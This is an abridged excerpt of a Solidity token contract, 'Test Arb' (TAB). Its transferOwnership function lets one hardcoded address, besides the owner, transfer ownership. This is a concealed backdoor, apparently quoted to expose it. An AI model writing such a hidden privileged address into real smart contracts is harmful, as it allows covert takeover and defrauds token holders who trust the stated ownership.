...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xf494EF55BBc08dd64a227D0F1BB7bB6d0aA60865));
...
contract TESTDEFOU is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "TAB";
  string private _name = "Test Arb";
